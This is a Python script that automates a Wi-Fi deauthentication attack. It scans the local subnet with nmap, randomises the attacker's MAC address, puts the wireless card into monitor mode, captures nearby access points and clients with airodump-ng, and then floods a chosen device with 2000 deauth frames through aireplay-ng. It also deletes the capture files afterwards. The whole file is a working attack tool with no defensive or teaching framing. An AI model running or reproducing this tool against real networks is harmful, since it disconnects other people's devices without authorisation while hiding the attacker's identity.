import os
import time
import subprocess 
def main():
    init()
    menu()
    while True:
        op = input('> ')
        if op == "deauth":
            deauth()

def menu():
    print("[*] deauth\n")

def checkMon():
    wifiInterface = subprocess.check_output("sudo iw dev | awk '$1==\"Interface\"{print $2}'",shell=True).decode("utf-8")[:-1]
    try:
        wifiInterface = wifiInterface.split('\n')
    except Exception:
        print('fail')
    monInterface = [mon for mon in wifiInterface if 'mon' in mon]
    if len(monInterface) > 0:
        print("\n[*] Found one interface in monitor mode")
        print("\n[*] Stopping it")
        [subprocess.call("sudo airmon-ng stop " + mon,shell=True) for mon in monInterface]
    return 0

def nmapList():
    ip  = subprocess.check_output("hostname -I",shell=True).decode("utf-8")[:-1].split('.')
    ipBase = ip[0] + "."  + ip[1] + "."  + ip[2] + ".0/24"
    subprocess.check_output("sudo nmap -F " + ipBase + " >> ipsInfo",shell=True)
    with open('ipsInfo','r') as f:
        data = f.read().splitlines()
    scan = "Nmap scan report"
    scanReport = []
    new = False
    i = 0
    unique = []
    temp = []
    while len(data) > 0:
        i = 0
        try:
            if scan in data[0]:
                newData = data[0].split(' ')
                hostname = newData[-2]
                ip = newData[-1][1:-1]
                temp.append(hostname)
                temp.append(ip)
                del data[0]
                while not scan in data[i]:
                    if "MAC" in data[i]:
                        MAC = data[i].split(' ')[2]
                        temp.append(MAC)
                    del data[i]
                    i+=1
                unique.append(temp[:])
                del temp[:]
            else:
                i = 0
                del data[0]
        except Exception as e:
            pass
    
    return unique

def changeMac():
    wifiInterface = subprocess.check_output("sudo iw dev | awk '$1==\"Interface\"{print $2}'",shell=True).decode("utf-8")[:-1]
    print("\n[*] Changing MAC Address of computer")
    try:
        subprocess.call("sudo ifconfig " + wifiInterface + " down",shell=True)
        subprocess.call("sudo macchanger -r " + wifiInterface,shell=True)
        subprocess.call("sudo ifconfig " + wifiInterface + " up",shell=True)
    except Exception:
        print("[!] Failed to change MAC Address\n")

def restartNetwork(monitorInterface):
    print("\n[*] Restarting Network")
    try:
        subprocess.call("sudo airmon-ng stop " + monitorInterface,shell=True)
        subprocess.call("sudo service network-manager restart",shell=True)
    except Exception:
        print("[!] Failed to restart network")

def deauth():
    clients = nmapList()
    print("Whats the Wi-Fi Name?\n")
    wifiName = input('> ')
    checkMon()
    changeMac()
    print("\n[*] Killing processes")
    try:
        subprocess.call("sudo airmon-ng check kill",shell=True)
    except Exception:
        print("[*] Failed to kill processes\n")

    print("\n[*] Getting name of wireless interface")
    try:
        name = subprocess.check_output("sudo iw dev | awk '$1==\"Interface\"{print $2}'",shell=True).decode("utf-8")[:-1]
    except Exception:
        print("[!] Failed to get wireless interface name")
    
    print("\n[*] Starting monitor mode on " + name)
    try:
        command = "sudo airmon-ng start " + name
        subprocess.call("sudo airmon-ng start " + name,shell=True)
    except Exception:
        print("[!] Failed to start monitor mode\n")

    name = subprocess.check_output("sudo iw dev | awk '$1==\"Interface\"{print $2}'",shell=True).decode("utf-8")[:-1].split('\n')
    monWifi = [mon for mon in name if 'mon' in mon][0]
    print("\n[*] Starting to listening to traffic")
    try:
        bssids = subprocess.check_output("sudo airodump-ng -w bssidNames " + monWifi,timeout=5,shell=True).decode("utf-8")[:-1]
    except KeyboardInterrupt:
        dirs = os.listdir()
        airodumpFile = [air for air in dirs if "bssidNames" in air]
        csvFile = [csv for csv in airodumpFile if ".csv" in csv  and not ".kismet" in csv][0]
        with open(csvFile,'r') as f:
            data = f.read().splitlines()
        try:
            wifiData = [wifi for wifi in data if wifiName in wifi][0]
            wifiData = wifiData.split(',')
            wifiBssid = wifiData[0]
            wifiChannel = wifiData[3]
            peopleOnWifi = [people for people in data if wifiBssid in people]
            mac = [m.split(',')[0] for m in peopleOnWifi][1:]
            [subprocess.call("sudo rm " + f,shell=True) for f in airodumpFile]
        except Exception:
            print("\n[!] Failed to get wifi Data, try to wait a little longer before hit Ctrl-C")
    i = 0 
    subprocess.call("clear",shell=True)
    for m in mac:
        for i,client in enumerate(clients):
            if m == client[2]:
                print("["+str(i)+"]")
                print("Computer name : " + client[0])
                print("Ip address : " + client[1])
            
    print("What computer do you want do deauth, ex 0")
    op = input('> ')
    command = 'sudo aireplay-ng --deauth 2000 -a ' + wifiBssid + ' -c ' + clients[int(op)][2] + ' ' + monWifi + ' --ignore-negative-one'
    try:
        subprocess.call(command,shell=True)
        print("\n[*] Done")
    except KeyboardInterrupt:
        print('\n[*] Done\n')
        restartNetwork(monWifi)
    

def init():
    print("NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNNNNds+/////+shmNNNNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNNdo//oyhhhys//+hNNNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNm//+dNNNNNNNmo//hNNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNy//hNNNNNNNNNm//+NNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNs//dNNNNNNNNNN//+NNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNs//dNNNNNNNNNN//+NNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNs//dNNNNNNNNNN//+NNNNNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNmhhyo//syyyyyyyyyy//+yyhmNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNs+//:::::::::::::::::///+NNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNs+//:::::::::::::::::/+/+NNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNssy/////////++///////sosoNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNyyysso+///ydmdh///ss+oo+oNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNyss++/////hmmmm+//++//+++NNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNyss++ooo//+dmmo///////ssoNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNyyysoooo//+mmms///++//+++NNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNssso//////+ssso///sooossoNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNsysss/////////////////ssoNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNmNs++/////////////////////+NNNNNNNmNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNho++++++++++++++++++++++yNNNNNNNNNNNNNNNNNN")
    print("NNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNN")
    print("\n\n\n")

main()
